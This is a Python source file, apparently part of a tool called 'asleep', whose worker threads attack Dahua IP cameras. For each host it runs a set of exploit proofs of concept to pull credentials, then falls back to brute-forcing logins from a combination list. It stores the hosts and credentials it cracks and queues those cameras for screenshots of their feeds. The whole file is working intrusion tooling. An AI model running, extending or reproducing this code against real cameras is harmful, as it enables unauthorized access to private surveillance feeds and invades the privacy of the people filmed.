import logging
import random
import socket
import threading

from asleep.config import config, update_status
from asleep.dahua import DahuaController, Status
from pocs import ALL_POCS


class BruteThread(threading.Thread):
    _lock = threading.Lock()

    def __init__(self, brute_queue, screenshot_queue):
        threading.Thread.__init__(self)
        self.brute_queue = brute_queue
        self.screenshot_queue = screenshot_queue

    def run(self):
        while True:
            host = self.brute_queue.get()
            self.dahua_auth(host)
            self.brute_queue.task_done()

    def dahua_login(self, ip, port, login, password):
        with BruteThread._lock:
            update_status()
            logging.debug(f'Login attempt: {ip} with {login}:{password}')
        dahua = DahuaController(ip, port, login, password)
        if dahua.status is Status.SUCCESS:
            logging.debug(f'Success login: {dahua.ip} with {login}:{password}')
            return dahua
        elif dahua.status is Status.BLOCKED:
            logging.debug(f'Blocked camera: {dahua.ip}:{dahua.port}')
            return Status.BLOCKED
        else:
            logging.debug(f'Unable to login: {dahua.ip}:{dahua.port} with {login}:{password}')
            return Status.NONE

    def _try_pocs(self, ip, port, timeout=10):
        for poc in ALL_POCS:
            try:
                user, password, vuln_name = poc(ip, timeout=timeout)
                if user and password:
                    logging.info(f'[PoC] {ip}:{port} {vuln_name} → {user}:{password}')
                    return user, password, vuln_name
            except Exception:
                pass
        return None, None, None

    def dahua_auth(self, host):
        ip = host[0]
        port = int(host[1])

        user, password, vuln_name = self._try_pocs(ip, port)
        if user and password:
            login = user
            password_tmp = password
            try:
                dahua = DahuaController(ip, port, login, password_tmp)
                if dahua.status is Status.SUCCESS:
                    with BruteThread._lock:
                        config['working_hosts'].append([dahua.ip, dahua.port, dahua.login, dahua.password, dahua])
                        config['ch_count'] += dahua.channels_count
                    self.screenshot_queue.put(dahua)
                    return
            except Exception:
                pass

        for combination in config['combinations']:
            login = combination[0]
            password = combination[1]
            try:
                res = self.dahua_login(ip, port, login, password)
                if res is Status.BLOCKED:
                    break
                if res is Status.NONE:
                    continue
                config['working_hosts'].append([res.ip, res.port, res.login, res.password, res])
                config['ch_count'] += res.channels_count
                self.screenshot_queue.put(res)
                return
            except socket.timeout as e:
                logging.debug(f'Timeout error: {ip}:{port} - {str(e)}')
                return
            except Exception as e:
                logging.debug(f'Connection error: {ip}:{port} - {str(e)}')
